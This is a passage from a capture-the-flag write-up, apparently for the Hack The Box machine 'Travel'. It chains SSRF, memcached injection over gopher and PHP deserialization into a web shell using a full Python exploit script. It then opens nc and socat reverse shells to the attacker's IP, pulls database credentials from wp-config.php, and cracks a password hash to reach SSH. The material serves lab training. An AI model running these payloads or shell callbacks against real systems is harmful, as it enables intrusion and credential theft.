<h4 id="Memcached-And-Gopher-Protocol"><a href="#Memcached-And-Gopher-Protocol" class="headerlink" title="Memcached And Gopher Protocol"></a>Memcached And Gopher Protocol</h4><p>Another problem arise, using HTTP to inject <code>memcached</code> payload probably won’t work since <code>HTTP</code> need a specific format to be valid (like <code>host</code> and a bunch of carriage return). </p>
<p> <code>memcached</code> protocol needs data to includes sequences of commands and data ending by two CRLF:</p>
<blockquote>
<p>There are two kinds of data sent in the memcache protocol: text lines<br>and unstructured data.  Text lines are used for commands from clients<br>and responses from servers. Unstructured data is sent when a client<br>wants to store or retrieve data. The server will transmit back<br>unstructured data in exactly the same way it received it, as a byte<br>stream. The server doesn’t care about byte order issues in<br>unstructured data and isn’t aware of them. There are no limitations on<br>characters that may appear in unstructured data; however, the reader<br>of such data (either a client or a server) will always know, from a<br>preceding text line, the exact length of the data block being<br>transmitted.</p>
<p>Text lines are always terminated by \r\n. Unstructured data is <em>also</em><br>terminated by \r\n, even though \r, \n or any other 8-bit characters<br>may also appear inside the data. Therefore, when a client retrieves<br>data from a server, it must use the length of the data block (which it<br>will be provided with) to determine where the data block ends, and not<br>the fact that \r\n follows the end of the data block, even though it<br>does.</p>
</blockquote>
<p>A workaround to this format issue is to use the <code>gopher://</code> protocol instead of <code>http://</code>:</p>
<blockquote>
<p>The Gopher protocol is a communications protocol designed for distributing, searching, and retrieving documents in Internet Protocol networks. The design of the Gopher is presented as an alternative to the World Wide Web in its early stages, but ultimately fell into disfavor, yielding to the Hypertext Transfer Protocol (HTTP). </p>
<p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Gopher_(protocol)">https://en.wikipedia.org/wiki/Gopher_(protocol)</a></p>
</blockquote>
<p>While not being widely used, Gopher is still supported by <code>curl</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ man curl</span><br><span class="line">DESCRIPTION</span><br><span class="line">       curl  is  a tool to transfer data from or to a server, using one of the supported protocols</span><br><span class="line">       (DICT, FILE, FTP, FTPS, GOPHER, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, MQTT,  POP3,  POP3S,</span><br><span class="line">       RTMP, RTSP, SCP, SFTP, SMB, SMBS, SMTP, SMTPS, TELNET and TFTP). The <span class="built_in">command</span> is designed to</span><br><span class="line">       work without user interaction.</span><br></pre></td></tr></table></figure>

<p>Alright! We those informations we can start creating our <code>memcached</code> command to inject on the server.</p>
<p>First let’s create our serialized PHP web-shell payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="keyword">require</span>(<span class="string">&quot;TemplateHelper.php&quot;</span>);</span><br><span class="line">php &gt; <span class="variable">$file</span> = <span class="string">&#x27;hg8.php&#x27;</span>;</span><br><span class="line">php &gt; <span class="variable">$data</span> = <span class="string">&#x27;&lt;?php system($_REQUEST[&quot;cmd&quot;]);&#x27;</span>;</span><br><span class="line">php &gt; <span class="variable">$o</span> = <span class="keyword">new</span> TemplateHelper(<span class="variable">$file</span>, <span class="variable">$data</span>);</span><br><span class="line">php &gt; <span class="keyword">echo</span> serialize(<span class="variable">$o</span>);</span><br><span class="line">O:<span class="number">14</span>:<span class="string">&quot;TemplateHelper&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;hg8.php&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;data&quot;</span>;s:<span class="number">31</span>:<span class="string">&quot;&lt;?php system(<span class="subst">$_REQUEST</span>[&quot;</span>cmd<span class="string">&quot;]);&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>Now we can create the <code>memcached</code> command we need to execute:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set xct_4e5612ba079c530a6b1f148c0b352241 4 0 131</span><br><span class="line">O:14:&quot;TemplateHelper&quot;:2:&#123;s:4:&quot;file&quot;;s:7:&quot;hg8.php&quot;;s:4:&quot;data&quot;;s:31:&quot;&lt;?php system($_REQUEST[&quot;cmd&quot;]);&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>URL Encoding this command and send it through <code>curl</code> using <code>gopher://</code> protocol should work. Let’s give it a try and get our answer :) </p>
<h3 id="Chaining-vulnerabilities-for-RCE"><a href="#Chaining-vulnerabilities-for-RCE" class="headerlink" title="Chaining vulnerabilities for RCE"></a>Chaining vulnerabilities for RCE</h3><p>We have quite a few vulnerabilities to chain in order to achieve Remote Code execution. We need to:</p>
<p><strong>SSRF</strong> -&gt; <strong>Memcached Injection</strong> -&gt; <strong>Object Deserialization</strong> -&gt; <strong>Arbitrary File Write</strong></p>
<p>Since it’s going to be a pain let’s write a script to pull the exploit:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://blog.travel.htb/&quot;</span></span><br><span class="line">shell = <span class="string">&quot;hg8.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_payload</span>():</span></span><br><span class="line">    len_shell = <span class="built_in">str</span>(<span class="built_in">len</span>(shell))</span><br><span class="line">    php_obj = <span class="string">&#x27;O:14:&quot;TemplateHelper&quot;:2:&#123;s:4:&quot;file&quot;;s:&#x27;</span>+len_shell+<span class="string">&#x27;:&quot;&#x27;</span>+shell+<span class="string">&#x27;&quot;;s:4:&quot;data&quot;;s:31:&quot;&lt;?php system($_REQUEST[&quot;cmd&quot;]);&quot;;&#125;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    len_php_obj = <span class="built_in">len</span>(php_obj)</span><br><span class="line">    memcached_cmd = <span class="string">f&quot;\r\nset xct_4e5612ba079c530a6b1f148c0b352241 0 0 <span class="subst">&#123;len_php_obj&#125;</span>\r\n<span class="subst">&#123;php_obj&#125;</span>\r\n&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Memcached command to run: <span class="subst">&#123;memcached_cmd&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    encoded_payload = urllib.parse.quote(memcached_cmd)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;gopher://127.1:11211/<span class="subst">&#123;encoded_payload&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inject_payload</span>(<span class="params">payload</span>):</span></span><br><span class="line">    ssrf_payload = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>awesome-rss/?debug&amp;custom_feed_url=<span class="subst">&#123;payload&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+]Final SSRF Payload: <span class="subst">&#123;ssrf_payload&#125;</span>\n&quot;</span>)</span><br><span class="line">    r = requests.get(ssrf_payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deserialize</span>():</span></span><br><span class="line">    requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>awesome-rss/&quot;</span>)</span><br><span class="line">    webshell_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>wp-content/themes/twentytwenty/logs/<span class="subst">&#123;shell&#125;</span>&quot;</span></span><br><span class="line">    webshell = requests.get(webshell_url)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Checking for <span class="subst">&#123;shell&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> webshell.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] File found! Injection successful.&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    payload = generate_payload()</span><br><span class="line">    inject_payload(payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        deserialize()</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>Let’s run it to see if everything goes fine:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python exploit-test.py</span><br><span class="line">[+] Memcached <span class="built_in">command</span> to run:</span><br><span class="line"><span class="built_in">set</span> xct_4e5612ba079c530a6b1f148c0b352241 0 0 101</span><br><span class="line">O:14:<span class="string">&quot;TemplateHelper&quot;</span>:2:&#123;s:4:<span class="string">&quot;file&quot;</span>;s:7:<span class="string">&quot;hg8.php&quot;</span>;s:4:<span class="string">&quot;data&quot;</span>;s:31:<span class="string">&quot;&lt;?php system(<span class="variable">$_REQUEST</span>[&quot;</span>cmd<span class="string">&quot;]);&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line">[+] Final SSRF Payload: </span><br><span class="line">http://blog.travel.htb/awesome-rss/?debug&amp;custom_feed_url=gopher://127.1:11211/%0D%0Aset%20xct_4e5612ba079c530a6b1f148c0b352241%200%200%20101%0D%0AO%3A14%3A%22TemplateHelper%22%3A2%3A%7Bs%3A4%3A%22file%22%3Bs%3A7%3A%22hg8.php%22%3Bs%3A4%3A%22data%22%3Bs%3A31%3A%22%3C%3Fphp%20system%28%24_REQUEST%5B%22cmd%22%5D%29%3B%22%3B%7D%0D%0A</span><br><span class="line"></span><br><span class="line">[+] Checking <span class="keyword">for</span> hg8.php</span><br><span class="line">[*] File found! Injection successful.</span><br></pre></td></tr></table></figure>

<p>Bingo it worked! </p>
<h3 id="Upgrade-Web-Shell-with-Socat"><a href="#Upgrade-Web-Shell-with-Socat" class="headerlink" title="Upgrade Web-Shell with Socat"></a>Upgrade Web-Shell with Socat</h3><p>Alright now we have our web-shell:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl <span class="string">&quot;http://blog.travel.htb/wp-content/themes/twentytwenty/logs/hg8.php?cmd=id&quot;</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>

<p>Let’s open a reverse shell to upgrade to a more stable shell:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl <span class="string">&quot;http://blog.travel.htb/wp-content/themes/twentytwenty/logs/hg8.php?cmd=nc%20-e%20/bin/bash%2010.10.10.10%208585&quot;</span> </span><br></pre></td></tr></table></figure>

<p>And we get a new connection to open on our listener:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.189:47778</span><br></pre></td></tr></table></figure>

<p>Unfortunately there is no <code>python</code> nor <code>python3</code> installed on the box allowing us to upgrade our shell. Thankfully after a bit of search we found out <code>socat</code> is installed. Let’s upgrade our shell using it:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.189:47778</span><br><span class="line">$ <span class="built_in">which</span> python</span><br><span class="line"><span class="built_in">which</span> python3</span><br><span class="line">$ <span class="built_in">which</span> socat</span><br><span class="line">/usr/bin/socat</span><br><span class="line">$ socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444</span><br></pre></td></tr></table></figure>

<p>Now we have a proper shell:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 4444</span><br><span class="line">Listening on any address 4444 (krb524)</span><br><span class="line">Connection from 10.10.10.189:33944</span><br><span class="line">www-data@blog:/var/www/html/wp-content/themes/twentytwenty/logs$</span><br><span class="line">www-data@blog:/$</span><br></pre></td></tr></table></figure>

<p>What a ride! Let’s see what’s next.</p>
<h3 id="Pivot-www-data-gt-lynik-admin"><a href="#Pivot-www-data-gt-lynik-admin" class="headerlink" title="Pivot www-data -&gt; lynik-admin"></a>Pivot www-data -&gt; lynik-admin</h3><p>The <code>hostname</code> and different informations makes us understand we are in a Docker container:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">www-data@blog:/$ ls -la /</span><br><span class="line">total 88</span><br><span class="line">drwxr-xr-x   1 root root 4096 Apr 23 18:44 .</span><br><span class="line">drwxr-xr-x   1 root root 4096 Apr 23 18:44 ..</span><br><span class="line">-rwxr-xr-x   1 root root    0 Apr 23 18:44 .dockerenv</span><br><span class="line">www-data@blog:/home$ cat /proc/1/cgroup</span><br><span class="line">12:devices:/docker/f66f3e777ae0553cc95bd5a7179465eb8e38a01be007426d07e72a3b367f2dc6</span><br><span class="line">11:memory:/docker/f66f3e777ae0553cc95bd5a7179465eb8e38a01be007426d07e72a3b367f2dc6</span><br><span class="line">10:freezer:/docker/f66f3e777ae0553cc95bd5a7179465eb8e38a01be007426d07e72a3b367f2dc6</span><br><span class="line">9:perf_event:/docker/f66f3e777ae0553cc95bd5a7179465eb8e38a01be007426d07e72a3b367f2dc6</span><br><span class="line">7:net_cls,net_prio:/docker/f66f3e777ae0553cc95bd5a7179465eb8e38a01be007426d07e72a3b367f2dc6</span><br><span class="line">6:hugetlb:/docker/f66f3e777ae0553cc95bd5a7179465eb8e38a01be007426d07e72a3b367f2dc6</span><br><span class="line">5:blkio:/docker/f66f3e777ae0553cc95bd5a7179465eb8e38a01be007426d07e72a3b367f2dc6</span><br><span class="line">4:cpu,cpuacct:/docker/f66f3e777ae0553cc95bd5a7179465eb8e38a01be007426d07e72a3b367f2dc6</span><br><span class="line">3:pids:/docker/f66f3e777ae0553cc95bd5a7179465eb8e38a01be007426d07e72a3b367f2dc6</span><br><span class="line">2:cpuset:/docker/f66f3e777ae0553cc95bd5a7179465eb8e38a01be007426d07e72a3b367f2dc6</span><br><span class="line">1:name=systemd:/docker/f66f3e777ae0553cc95bd5a7179465eb8e38a01be007426d07e72a3b367f2dc6</span><br></pre></td></tr></table></figure>

<p>Well let’s keep that in mind and continue our recon.</p>
<p>Since we know the travel website is a Wordpress site we can retrieve database credentials inside <code>wp-config.php</code> file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@blog:/var/www/html$ cat wp-config.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">define( <span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wp&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;wp&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;fiFtDDV9LYe8Ti&#x27;</span> );</span><br></pre></td></tr></table></figure>

<p>Let’s see if we can retrieve interesting accounts from the database:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">www-data@blog:/var/www/html$ mysql -u wp -p</span><br><span class="line">mysql -u wp -p</span><br><span class="line">Enter password: fiFtDDV9LYe8Ti</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; SHOW DATABASES;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| wp                 |</span><br><span class="line">+--------------------+</span><br><span class="line">4 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.001 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; USE wp</span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">MariaDB [wp]&gt; SHOW TABLES;</span><br><span class="line">+-----------------------+</span><br><span class="line">| Tables_in_wp          |</span><br><span class="line">+-----------------------+</span><br><span class="line">| wp_commentmeta        |</span><br><span class="line">| wp_comments           |</span><br><span class="line">| wp_links              |</span><br><span class="line">| wp_options            |</span><br><span class="line">| wp_postmeta           |</span><br><span class="line">| wp_posts              |</span><br><span class="line">| wp_term_relationships |</span><br><span class="line">| wp_term_taxonomy      |</span><br><span class="line">| wp_termmeta           |</span><br><span class="line">| wp_terms              |</span><br><span class="line">| wp_usermeta           |</span><br><span class="line">| wp_users              |</span><br><span class="line">+-----------------------+</span><br><span class="line">12 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.000 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [wp]&gt; SELECT * FROM wp_users;</span><br><span class="line">+----+------------+------------------------------------+---------------+------------------+------------------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">| ID | user_login | user_pass                          | user_nicename | user_email       | user_url         | user_registered     | user_activation_key | user_status | display_name |</span><br><span class="line">+----+------------+------------------------------------+---------------+------------------+------------------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">|  1 | admin      | $P<span class="variable">$BIRXVj</span>/ZG0YRiBH8gnRy0chBx67WuK/ | admin         | admin@travel.htb | http://localhost | 2020-04-13 13:19:01 |                     |           0 | admin        |</span><br><span class="line">+----+------------+------------------------------------+---------------+------------------+------------------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.000 sec)</span><br></pre></td></tr></table></figure>

<p>We have a hash from <code>admin</code> account. Unfortunately <code>John</code> can not seem to crack it. Let’s move on.</p>
<p>While looking around we quickly stumble upon a database backup file in <code>/opt/wordpress/</code> containing another user account belonging to <code>lynik-admin</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">www-data@blog:/opt/wordpress$ grep -ri <span class="string">&quot;wp_users&quot;</span> backup-13-04-2020.sql</span><br><span class="line">grep <span class="string">&quot;wp_users&quot;</span> backup-13-04-2020.sql</span><br><span class="line">[...]</span><br><span class="line">CREATE TABLE `wp_users` (</span><br><span class="line">-- Dumping data <span class="keyword">for</span> table `wp_users`</span><br><span class="line">LOCK TABLES `wp_users` WRITE;</span><br><span class="line">/*!40000 ALTER TABLE `wp_users` DISABLE KEYS */;</span><br><span class="line">INSERT INTO `wp_users` VALUES (1,<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;$P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;admin@travel.htb&#x27;</span>,<span class="string">&#x27;http://localhost&#x27;</span>,<span class="string">&#x27;2020-04-13 13:19:01&#x27;</span>,<span class="string">&#x27;&#x27;</span>,0,<span class="string">&#x27;admin&#x27;</span>),(2,<span class="string">&#x27;lynik-admin&#x27;</span>,<span class="string">&#x27;$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.&#x27;</span>,<span class="string">&#x27;lynik-admin&#x27;</span>,<span class="string">&#x27;lynik@travel.htb&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;2020-04-13 13:36:18&#x27;</span>,<span class="string">&#x27;&#x27;</span>,0,<span class="string">&#x27;Lynik Schmidt&#x27;</span>);</span><br><span class="line">/*!40000 ALTER TABLE `wp_users` ENABLE KEYS */;</span><br><span class="line">www-data@blog:/opt/wordpress$</span><br></pre></td></tr></table></figure>

<p>Let’s see if we can crack its password hash:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hugo@archpen ~]$ john --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt lynik-hash           </span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">1stepcloser      (?)</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>

<p>Bingo! Let’s see if we can connect through SSH using this credential:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[hugo@archpen ~]$ ssh lynik-admin@travel.htb</span><br><span class="line">lynik-admin@travel.htb<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System information as of Fri 29 May 2020 01:39:02 PM UTC</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System load:                      0.1</span></span><br><span class="line"><span class="string">  Usage of /:                       46.1% of 15.68GB</span></span><br><span class="line"><span class="string">  Memory usage:                     18%</span></span><br><span class="line"><span class="string">  Swap usage:                       0%</span></span><br><span class="line"><span class="string">  Processes:                        200</span></span><br><span class="line"><span class="string">  Users logged in:                  0</span></span><br><span class="line"><span class="string">  IPv4 address for br-836575a2ebbb: 172.20.0.1</span></span><br><span class="line"><span class="string">  IPv4 address for br-8ec6dcae5ba1: 172.30.0.1</span></span><br><span class="line"><span class="string">  IPv4 address for docker0:         172.17.0.1</span></span><br><span class="line"><span class="string">  IPv4 address for eth0:            10.10.10.189</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">lynik-admin@travel:~$ cat user.txt</span></span><br><span class="line"><span class="string">7xxxxxxxxxxxxxxxxxxxxxxxa</span></span><br></pre></td></tr></table></figure>

<h2 id="Root-FLag"><a href="#Root-FLag" class="headerlink" title="Root FLag"></a>Root FLag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>First thing that come to mind is to check for more informations about docker. We know that docker is running and hosting the Travel Blog:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">lynik-admin@travel:~$ ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="line">    link/ether 00:50:56:b9:c0:9b brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.10.10.189/24 brd 10.10.10.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: br-836575a2ebbb: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default</span><br><span class="line">    link/ether 02:42:48:28:52:95 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.20.0.1/24 brd 172.20.0.255 scope global br-836575a2ebbb</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">4: br-8ec6dcae5ba1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default</span><br><span class="line">    link/ether 02:42:6d:76:46:c1 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.30.0.1/24 brd 172.30.0.255 scope global br-8ec6dcae5ba1</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">5: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default</span><br><span class="line">    link/ether 02:42:28:4b:e0:70 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>

<p>Unfortunately <code>lynik-admin</code> does not belong to <code>docker</code> group so we can not escalate privileges this way (it would have been too easy right?).</p>
<h3 id="LDAP-Server"><a href="#LDAP-Server" class="headerlink" title="LDAP Server"></a>LDAP Server</h3><p>While looking around we notice a few informations about a LDAP server:</p>
